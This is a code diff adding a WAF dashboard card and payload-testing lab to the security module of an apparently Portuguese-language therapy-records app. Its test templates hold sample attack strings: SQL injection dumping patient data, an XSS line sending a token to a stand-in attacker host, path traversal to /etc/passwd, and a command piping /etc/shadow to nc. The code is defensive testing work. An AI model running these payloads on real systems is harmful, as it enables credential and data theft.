@@ -60,9 +60,11 @@ import type {
   StressTestReport,
   SecurityHardeningOverviewResponse,
   HoneypotProbeRecord,
-  WebRtcSessionAuditRecord
+  WebRtcSessionAuditRecord,
+  WafOverviewResponse,
+  InspectPayloadResponse
 } from '@terapiainfoco/shared';
-import { UserRole, KmsKeyStatus, StressScenario, SloStatus, WebRtcVerificationStatus, WebRtcSecurityGrade, WebRtcCipherSuite } from '@terapiainfoco/shared';
+import { UserRole, KmsKeyStatus, StressScenario, SloStatus, WebRtcVerificationStatus, WebRtcSecurityGrade, WebRtcCipherSuite, WafMode } from '@terapiainfoco/shared';
 
 interface SecurityModuleProps {
   currentUser: SafeUser;
@@ -237,9 +239,105 @@ export const SecurityModule: React.FC<SecurityModuleProps> = ({
     }
   };
 
+  // Estados do WAF em Camada de Aplicação (RFC-001 §4.4, §5.2 e OWASP Top 10)
+  const [wafOverview, setWafOverview] = useState<WafOverviewResponse | null>(null);
+  const [loadingWaf, setLoadingWaf] = useState<boolean>(false);
+  const [updatingWafMode, setUpdatingWafMode] = useState<boolean>(false);
+  const [testPayloadInput, setTestPayloadInput] = useState<string>("' OR '1'='1' -- UNION SELECT id, name, cpf FROM patients");
+  const [testPayloadContext, setTestPayloadContext] = useState<string>('prontuario-soap');
+  const [inspectingPayload, setInspectingPayload] = useState<boolean>(false);
+  const [inspectionResult, setInspectionResult] = useState<InspectPayloadResponse | null>(null);
+
+  const fetchWafOverview = async () => {
+    try {
+      setLoadingWaf(true);
+      const res = await api.getWafOverview();
+      setWafOverview(res);
+    } catch {
+      // Ignora para perfis sem permissão
+    } finally {
+      setLoadingWaf(false);
+    }
+  };
+
+  const handleUpdateWafMode = async (mode: WafMode) => {
+    try {
+      setUpdatingWafMode(true);
+      const res = await api.updateWafMode({
+        mode,
+        blockThreshold: 50
+      });
+      setFeedback({
+        type: 'success',
+        message: res.message
+      });
+      await fetchWafOverview();
+    } catch (err: any) {
+      setFeedback({
+        type: 'error',
+        message: err.message || 'Falha ao atualizar o modo operacional do WAF.'
+      });
+    } finally {
+      setUpdatingWafMode(false);
+    }
+  };
+
+  const handleInspectWafPayload = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
+    if (!testPayloadInput.trim()) return;
+    try {
+      setInspectingPayload(true);
+      const res = await api.inspectWafPayload({
+        payload: testPayloadInput,
+        context: testPayloadContext
+      });
+      setInspectionResult(res);
+      if (!res.inspection.passed) {
+        setFeedback({
+          type: 'error',
+          message: `Ameaça detectada no payload! Threat Score: ${res.threatScore}/100 (${res.blocked ? 'Bloqueio Imediato 403' : 'Monitoramento'}). Regras: ${res.inspection.matchedRules.map(r => r.ruleId).join(', ')}`
+        });
+      } else {
+        setFeedback({
+          type: 'success',
+          message: `Payload analisado com sucesso! Threat Score: ${res.threatScore}/100. Nenhuma heurística maliciosa detectada.`
+        });
+      }
+      await fetchWafOverview();
+    } catch (err: any) {
+      setFeedback({
+        type: 'error',
+        message: err.message || 'Falha ao inspecionar payload via WAF.'
+      });
+    } finally {
+      setInspectingPayload(false);
+    }
+  };
+
+  const applyWafTemplate = (type: 'sqli' | 'xss' | 'lfi' | 'cmd' | 'clean') => {
+    switch (type) {
+      case 'sqli':
+        setTestPayloadInput("' OR '1'='1' -- UNION SELECT id, name, cpf, encrypted_deks FROM patients WHERE '1'='1'");
+        break;
+      case 'xss':
+        setTestPayloadInput("<script>fetch('https://evil-attacker.com/steal?token=' + localStorage.getItem('token'))</script>");
+        break;
+      case 'lfi':
+        setTestPayloadInput("../../../../../etc/passwd%00/secret_keys.pem");
+        break;
+      case 'cmd':
+        setTestPayloadInput("; cat /etc/shadow | nc 198.51.100.22 4444 &");
+        break;
+      case 'clean':
+        setTestPayloadInput("Paciente relata redução significativa das crises de ansiedade após início dos exercícios de respiração diafragmática. Sono preservado.");
+        break;
+    }
+  };
+
   React.useEffect(() => {
     if (currentUser.role === UserRole.ADMIN || currentUser.role === UserRole.PSICOLOGO_TITULAR) {
       fetchWebrtcSessions();
+      fetchWafOverview();
     }
     if (currentUser.role === UserRole.ADMIN) {
       fetchInfraStatus();
@@ -3417,6 +3515,377 @@ export const SecurityModule: React.FC<SecurityModuleProps> = ({
                         ) : (
                           <span className="text-[10px] text-slate-400">Selada</span>
                         )}
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* Card 13: Web Application Firewall (WAF) & Detecção Heurística de Payloads (RFC-001 §4.4, §5.2 e OWASP Top 10) */}
+      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
+          <div className="flex items-center gap-3">
+            <div className="p-3 rounded-2xl bg-gradient-to-br from-indigo-500 to-rose-600 text-white shadow-md shadow-indigo-500/20">
+              <ShieldAlert className="w-6 h-6" />
+            </div>
+            <div>
+              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
+                Web Application Firewall (WAF) & Inspeção Heurística
+                <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-extrabold border uppercase tracking-wider ${
+                  wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK
+                    ? 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border-rose-300 dark:border-rose-700'
+                    : 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border-amber-300 dark:border-amber-700'
+                }`}>
+                  {wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK ? '🛡️ BLOQUEIO ATIVO (403)' : '👁️ MONITORAMENTO APENAS'}
+                </span>
+              </h2>
+              <p className="text-xs text-slate-500 dark:text-slate-400">
+                Inspeção profunda de requisições HTTP antes do desembrulho criptográfico: bloqueio preventivo de SQL Injection, XSS, Path Traversal e Command Injection com registro forense no ledger WORM.
+              </p>
+            </div>
+          </div>
+
+          <div className="flex items-center gap-2">
+            {currentUser.role === UserRole.ADMIN && (
+              <div className="flex items-center bg-slate-100 dark:bg-slate-800 p-1 rounded-xl border border-slate-200 dark:border-slate-700">
+                <button
+                  type="button"
+                  onClick={() => handleUpdateWafMode(WafMode.ACTIVE_BLOCK)}
+                  disabled={updatingWafMode || wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK}
+                  className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
+                    wafOverview?.metrics.mode === WafMode.ACTIVE_BLOCK
+                      ? 'bg-rose-600 text-white shadow-sm'
+                      : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
+                  }`}
+                >
+                  Bloqueio Ativo
+                </button>
+                <button
+                  type="button"
+                  onClick={() => handleUpdateWafMode(WafMode.MONITOR_ONLY)}
+                  disabled={updatingWafMode || wafOverview?.metrics.mode === WafMode.MONITOR_ONLY}
+                  className={`px-3 py-1 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
+                    wafOverview?.metrics.mode === WafMode.MONITOR_ONLY
+                      ? 'bg-amber-600 text-white shadow-sm'
+                      : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white'
+                  }`}
+                >
+                  Monitorar Apenas
+                </button>
+              </div>
+            )}
+            <button
+              onClick={fetchWafOverview}
+              disabled={loadingWaf}
+              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
+              title="Atualizar métricas do WAF"
+            >
+              <RefreshCw className={`w-3.5 h-3.5 ${loadingWaf ? 'animate-spin' : ''}`} />
+              <span>Atualizar</span>
+            </button>
+          </div>
+        </div>
+
+        {/* 4 KPIs do WAF */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+          <div className="p-4 rounded-2xl bg-indigo-50/60 dark:bg-indigo-950/20 border border-indigo-200 dark:border-indigo-800/60">
+            <div className="flex items-center justify-between text-indigo-700 dark:text-indigo-300 text-xs font-semibold mb-1">
+              <span>Requisições Inspecionadas</span>
+              <span className="p-1 rounded-lg bg-indigo-100 dark:bg-indigo-900/40 font-mono text-[10px]">
+                RFC §4.4
+              </span>
+            </div>
+            <div className="text-2xl font-black text-indigo-900 dark:text-indigo-100 font-mono">
+              {wafOverview?.metrics.totalInspections ?? 0}
+            </div>
+            <p className="text-[11px] text-indigo-700/80 dark:text-indigo-300/80 mt-1">
+              Varredura pré-desembrulho de payloads
+            </p>
+          </div>
+
+          <div className="p-4 rounded-2xl bg-rose-50/60 dark:bg-rose-950/20 border border-rose-200 dark:border-rose-800/60">
+            <div className="flex items-center justify-between text-rose-700 dark:text-rose-300 text-xs font-semibold mb-1">
+              <span>Ataques Bloqueados</span>
+              <span className="p-1 rounded-lg bg-rose-100 dark:bg-rose-900/40 font-mono text-[10px]">
+                HTTP 403
+              </span>
+            </div>
+            <div className="text-2xl font-black text-rose-900 dark:text-rose-100 font-mono">
+              {wafOverview?.metrics.totalAttacksBlocked ?? 0}
+            </div>
+            <p className="text-[11px] text-rose-700/80 dark:text-rose-300/80 mt-1">
+              Modo operacional: {wafOverview?.metrics.mode ?? 'ACTIVE_BLOCK'}
+            </p>
+          </div>
+
+          <div className="p-4 rounded-2xl bg-amber-50/60 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800/60">
+            <div className="flex items-center justify-between text-amber-700 dark:text-amber-300 text-xs font-semibold mb-1">
+              <span>Vetores Detectados</span>
+              <span className="p-1 rounded-lg bg-amber-100 dark:bg-amber-900/40 font-mono text-[10px]">
+                OWASP TOP 10
+              </span>
+            </div>
+            <div className="text-2xl font-black text-amber-900 dark:text-amber-100 font-mono">
+              {(wafOverview?.metrics.totalSqliAttempts ?? 0) +
+                (wafOverview?.metrics.totalXssAttempts ?? 0) +
+                (wafOverview?.metrics.totalTraversalAttempts ?? 0) +
+                (wafOverview?.metrics.totalCommandInjectionAttempts ?? 0)}
+            </div>
+            <p className="text-[11px] text-amber-700/80 dark:text-amber-300/80 mt-1 font-mono">
+              SQLi: {wafOverview?.metrics.totalSqliAttempts ?? 0} | XSS: {wafOverview?.metrics.totalXssAttempts ?? 0} | LFI: {wafOverview?.metrics.totalTraversalAttempts ?? 0} | CMD: {wafOverview?.metrics.totalCommandInjectionAttempts ?? 0}
+            </p>
+          </div>
+
+          <div className="p-4 rounded-2xl bg-teal-50/60 dark:bg-teal-950/20 border border-teal-200 dark:border-teal-800/60">
+            <div className="flex items-center justify-between text-teal-700 dark:text-teal-300 text-xs font-semibold mb-1">
+              <span>Limiar de Risco (Score)</span>
+              <span className="p-1 rounded-lg bg-teal-100 dark:bg-teal-900/40 font-mono text-[10px]">
+                Score ≥ {wafOverview?.metrics.blockThreshold ?? 50}
+              </span>
+            </div>
+            <div className="text-2xl font-black text-teal-900 dark:text-teal-100 font-mono">
+              {wafOverview?.metrics.blockThreshold ?? 50}/100
+            </div>
+            <p className="text-[11px] text-teal-700/80 dark:text-teal-300/80 mt-1">
+              Normalização anti-evasão multi-nível
+            </p>
+          </div>
+        </div>
+
+        {/* Simulador Interativo de Payloads Clínicos & Homologação de Regras */}
+        <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/50 border border-slate-200 dark:border-slate-800 space-y-4">
+          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+            <div>
+              <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
+                <Zap className="w-4 h-4 text-indigo-500" />
+                Laboratório de Testes & Homologação Heurística de Payloads
+              </h3>
+              <p className="text-xs text-slate-500 dark:text-slate-400">
+                Teste strings de entrada para validar a pontuação de ameaça (threatScore) e as regras que seriam disparadas antes da decifragem.
+              </p>
+            </div>
+
+            {/* Templates Rápidos */}
+            <div className="flex flex-wrap items-center gap-1.5">
+              <span className="text-[11px] font-semibold text-slate-500 dark:text-slate-400">Templates:</span>
+              <button
+                type="button"
+                onClick={() => applyWafTemplate('sqli')}
+                className="px-2.5 py-1 rounded-lg bg-rose-100 hover:bg-rose-200 dark:bg-rose-950/50 dark:hover:bg-rose-900/50 text-rose-800 dark:text-rose-300 text-[11px] font-medium transition-colors cursor-pointer border border-rose-200 dark:border-rose-800"
+              >
+                SQLi UNION
+              </button>
+              <button
+                type="button"
+                onClick={() => applyWafTemplate('xss')}
+                className="px-2.5 py-1 rounded-lg bg-amber-100 hover:bg-amber-200 dark:bg-amber-950/50 dark:hover:bg-amber-900/50 text-amber-800 dark:text-amber-300 text-[11px] font-medium transition-colors cursor-pointer border border-amber-200 dark:border-amber-800"
+              >
+                XSS Script
+              </button>
+              <button
+                type="button"
+                onClick={() => applyWafTemplate('lfi')}
+                className="px-2.5 py-1 rounded-lg bg-purple-100 hover:bg-purple-200 dark:bg-purple-950/50 dark:hover:bg-purple-900/50 text-purple-800 dark:text-purple-300 text-[11px] font-medium transition-colors cursor-pointer border border-purple-200 dark:border-purple-800"
+              >
+                Path Traversal
+              </button>
+              <button
+                type="button"
+                onClick={() => applyWafTemplate('cmd')}
+                className="px-2.5 py-1 rounded-lg bg-red-100 hover:bg-red-200 dark:bg-red-950/50 dark:hover:bg-red-900/50 text-red-800 dark:text-red-300 text-[11px] font-medium transition-colors cursor-pointer border border-red-200 dark:border-red-800"
+              >
+                Command Inj
+              </button>
+              <button
+                type="button"
+                onClick={() => applyWafTemplate('clean')}
+                className="px-2.5 py-1 rounded-lg bg-emerald-100 hover:bg-emerald-200 dark:bg-emerald-950/50 dark:hover:bg-emerald-900/50 text-emerald-800 dark:text-emerald-300 text-[11px] font-medium transition-colors cursor-pointer border border-emerald-200 dark:border-emerald-800"
+              >
+                Nota Clínica Válida
+              </button>
+            </div>
+          </div>
+
+          <form onSubmit={handleInspectWafPayload} className="space-y-3">
+            <div>
+              <textarea
+                rows={3}
+                value={testPayloadInput}
+                onChange={(e) => setTestPayloadInput(e.target.value)}
+                placeholder="Insira o payload de teste (texto, SQL, HTML, script, etc.)..."
+                className="w-full px-3.5 py-2.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono focus:outline-none focus:ring-2 focus:ring-indigo-500 shadow-inner"
+              />
+            </div>
+
+            <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
+              <div className="flex items-center gap-2 text-xs text-slate-600 dark:text-slate-400 w-full sm:w-auto">
+                <span className="font-semibold">Contexto:</span>
+                <input
+                  type="text"
+                  value={testPayloadContext}
+                  onChange={(e) => setTestPayloadContext(e.target.value)}
+                  placeholder="Ex: anamnese, prontuario-soap"
+                  className="px-2.5 py-1 rounded-lg bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
+                />
+              </div>
+
+              <button
+                type="submit"
+                disabled={inspectingPayload || !testPayloadInput.trim()}
+                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50 w-full sm:w-auto justify-center"
+              >
+                <Play className={`w-3.5 h-3.5 ${inspectingPayload ? 'animate-spin' : ''}`} />
+                <span>{inspectingPayload ? 'Inspecionando Heurística...' : 'Executar Inspeção do WAF'}</span>
+              </button>
+            </div>
+          </form>
+
+          {/* Resultado Pericial da Inspeção */}
+          {inspectionResult && (
+            <div className={`p-4 rounded-2xl border transition-all space-y-3 ${
+              !inspectionResult.inspection.passed
+                ? 'bg-rose-50/70 dark:bg-rose-950/30 border-rose-200 dark:border-rose-900/60'
+                : 'bg-emerald-50/70 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900/60'
+            }`}>
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-2 border-b border-slate-200/60 dark:border-slate-800">
+                <div className="flex items-center gap-2">
+                  {!inspectionResult.inspection.passed ? (
+                    <AlertCircle className="w-5 h-5 text-rose-600 dark:text-rose-400 shrink-0" />
+                  ) : (
+                    <CheckCircle2 className="w-5 h-5 text-emerald-600 dark:text-emerald-400 shrink-0" />
+                  )}
+                  <span className={`text-xs font-bold ${
+                    !inspectionResult.inspection.passed
+                      ? 'text-rose-800 dark:text-rose-300'
+                      : 'text-emerald-800 dark:text-emerald-300'
+                  }`}>
+                    {!inspectionResult.inspection.passed ? 'AMEAÇA MALICIOSA DETECTADA (PAYLOAD INSEGURO)' : 'PAYLOAD ÍNTEGRO (APROVADO PELO WAF)'}
+                  </span>
+                </div>
+
+                <div className="flex items-center gap-3 text-xs">
+                  <span className="text-slate-600 dark:text-slate-400">
+                    Threat Score: <strong className={`font-mono text-sm ${
+                      inspectionResult.threatScore >= 50
+                        ? 'text-rose-600 dark:text-rose-400'
+                        : inspectionResult.threatScore > 0
+                        ? 'text-amber-600 dark:text-amber-400'
+                        : 'text-emerald-600 dark:text-emerald-400'
+                    }`}>{inspectionResult.threatScore}/100</strong>
+                  </span>
+
+                  <span className={`px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase ${
+                    inspectionResult.blocked
+                      ? 'bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200'
+                      : 'bg-emerald-200 text-emerald-900 dark:bg-emerald-900 dark:text-emerald-200'
+                  }`}>
+                    {inspectionResult.blocked ? 'AÇÃO: BLOQUEADO (HTTP 403)' : (inspectionResult.inspection.passed ? 'AÇÃO: PERMITIDO' : 'AÇÃO: REGISTRADO')}
+                  </span>
+                </div>
+              </div>
+
+              {/* Regras Disparadas */}
+              {inspectionResult.inspection.matchedRules.length > 0 ? (
+                <div className="space-y-2">
+                  <div className="text-[11px] font-bold text-slate-700 dark:text-slate-300">
+                    Regras Disparadas no Catálogo Heurístico ({inspectionResult.inspection.matchedRules.length}):
+                  </div>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
+                    {inspectionResult.inspection.matchedRules.map((rule) => (
+                      <div
+                        key={rule.ruleId}
+                        className="p-2.5 rounded-xl bg-white dark:bg-slate-900 border border-rose-200 dark:border-rose-900/60 shadow-sm text-xs space-y-1"
+                      >
+                        <div className="flex items-center justify-between">
+                          <span className="font-mono font-bold text-rose-600 dark:text-rose-400">{rule.ruleId}</span>
+                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-rose-100 dark:bg-rose-950 text-rose-800 dark:text-rose-300 font-bold uppercase">
+                            {rule.category} • +{rule.severityScore} pts
+                          </span>
+                        </div>
+                        <p className="text-[11px] text-slate-600 dark:text-slate-300">{rule.description}</p>
+                        {rule.detectedPattern && (
+                          <div className="font-mono text-[10px] bg-slate-100 dark:bg-slate-800 p-1 rounded text-slate-800 dark:text-slate-200 truncate" title={rule.detectedPattern}>
+                            Match: "{rule.detectedPattern}"
+                          </div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              ) : (
+                <p className="text-xs text-emerald-700 dark:text-emerald-300">
+                  Nenhum padrão de ataque (SQLi, XSS, Path Traversal ou Command Injection) foi identificado neste payload. Liberado com segurança para o motor criptográfico.
+                </p>
+              )}
+            </div>
+          )}
+        </div>
+
+        {/* Tabela Forense de Incidentes Recentes do WAF Registrados no Ledger WORM */}
+        <div className="space-y-3">
+          <div className="flex items-center justify-between">
+            <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
+              <FileLock2 className="w-4 h-4 text-rose-500" />
+              Incidentes Recentes de Ataque Bloqueados no Ledger WORM
+            </h3>
+            <span className="text-xs text-slate-500 dark:text-slate-400">
+              {wafOverview?.recentIncidents.length ?? 0} registros preservados
+            </span>
+          </div>
+
+          {(!wafOverview?.recentIncidents || wafOverview.recentIncidents.length === 0) ? (
+            <div className="p-6 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-800 text-center text-xs text-slate-500 dark:text-slate-400">
+              Nenhum incidente de invasão ou payload malicioso registrado até o momento. Todos os fluxos de aplicação operando em conformidade estrita.
+            </div>
+          ) : (
+            <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
+              <table className="w-full text-left text-xs">
+                <thead className="bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-300 border-b border-slate-200 dark:border-slate-800">
+                  <tr>
+                    <th className="py-2.5 px-3.5 font-semibold">Timestamp</th>
+                    <th className="py-2.5 px-3.5 font-semibold">IP Origem</th>
+                    <th className="py-2.5 px-3.5 font-semibold">Vetor</th>
+                    <th className="py-2.5 px-3.5 font-semibold">Score</th>
+                    <th className="py-2.5 px-3.5 font-semibold">Regras</th>
+                    <th className="py-2.5 px-3.5 font-semibold">Ação</th>
+                    <th className="py-2.5 px-3.5 font-semibold">ID Registro</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
+                  {wafOverview.recentIncidents.map((incident) => (
+                    <tr key={incident.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/50 transition-colors">
+                      <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400 whitespace-nowrap font-mono text-[11px]">
+                        {new Date(incident.blockedAt).toLocaleString('pt-BR')}
+                      </td>
+                      <td className="py-2.5 px-3.5 font-mono text-slate-900 dark:text-white text-[11px]">
+                        {incident.ipAddress}
+                      </td>
+                      <td className="py-2.5 px-3.5">
+                        <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-800">
+                          {incident.attackType}
+                        </span>
+                      </td>
+                      <td className="py-2.5 px-3.5 font-mono font-bold text-rose-600 dark:text-rose-400">
+                        {incident.threatScore}/100
+                      </td>
+                      <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400 font-mono text-[11px]">
+                        {incident.primaryRuleId} ({incident.matchedRulesCount} regra{incident.matchedRulesCount > 1 ? 's' : ''})
+                      </td>
+                      <td className="py-2.5 px-3.5">
+                        <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold uppercase ${
+                          incident.status === 'BLOCKED'
+                            ? 'bg-rose-200 text-rose-900 dark:bg-rose-900 dark:text-rose-200'
+                            : 'bg-amber-200 text-amber-900 dark:bg-amber-900 dark:text-amber-200'
+                        }`}>
+                          {incident.status === 'BLOCKED' ? 'BLOQUEADO' : 'MONITORADO'}
+                        </span>
+                      </td>
+                      <td className="py-2.5 px-3.5 font-mono text-[10px] text-teal-600 dark:text-teal-400" title={incident.id}>
+                        {incident.id.slice(0, 8)}...
                       </td>
                     </tr>
                   ))}
